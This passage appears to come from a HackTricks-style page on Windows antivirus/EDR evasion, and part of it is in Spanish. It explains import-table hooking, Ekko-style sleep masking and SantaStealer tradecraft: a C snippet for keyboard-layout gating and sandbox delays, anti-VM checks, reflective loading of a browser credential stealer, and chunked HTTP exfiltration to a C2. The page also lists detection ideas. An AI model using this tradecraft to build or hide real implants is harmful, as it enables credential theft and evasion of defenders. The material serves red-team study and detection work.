- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra cómo los info‑stealers modernos mezclan AV bypass, anti‑analysis y acceso a credenciales en un único flujo de trabajo.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica por capas `check_antivm`

- Variant A recorre la lista de procesos, hashea cada nombre con una suma de comprobación rodante personalizada y lo compara contra blocklists embebidas para debuggers/sandboxes; repite la suma sobre el nombre del equipo y verifica directorios de trabajo como `C:\analysis`.
- Variant B inspecciona propiedades del sistema (umbral de conteo de procesos, tiempo operativo reciente), llama a `OpenServiceA("VBoxGuest")` para detectar adiciones de VirtualBox, y realiza comprobaciones de temporización alrededor de sleeps para detectar single-stepping. Cualquier detección aborta antes de que se lancen los módulos.

### Fileless helper + double ChaCha20 reflective loading

- El DLL/EXE primario embebe un Chromium credential helper que se deja en disco o se mapea manualmente en memoria; el modo fileless resuelve imports/relocations por sí mismo para que no se escriban artefactos del helper.
- Ese helper almacena un DLL de segunda etapa cifrado dos veces con ChaCha20 (dos claves de 32 bytes + nonces de 12 bytes). Tras ambas pasadas, carga reflectivamente el blob (no `LoadLibrary`) y llama a las exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Las rutinas de ChromElevator usan direct-syscall reflective process hollowing para inyectar en un navegador Chromium en ejecución, heredar claves de AppBound Encryption y descifrar contraseñas/cookies/tarjetas de crédito directamente desde bases de datos SQLite a pesar del hardening de ABE.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itera una tabla global de punteros a función `memory_generators` y lanza un hilo por cada módulo habilitado (Telegram, Discord, Steam, capturas de pantalla, documentos, extensiones del navegador, etc.). Cada hilo escribe resultados en buffers compartidos e informa su recuento de ficheros después de una ventana de join de ~45s.
- Una vez terminado, todo se comprime con la librería estáticamente ligada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` entonces duerme 15s y transmite el archivo en chunks de 10 MB vía HTTP POST a `http://<C2>:6767/upload`, suplantando una boundary de `multipart/form-data` de navegador (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, y el último chunk añade `complete: true` para que el C2 sepa que la reensamblación ha terminado.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
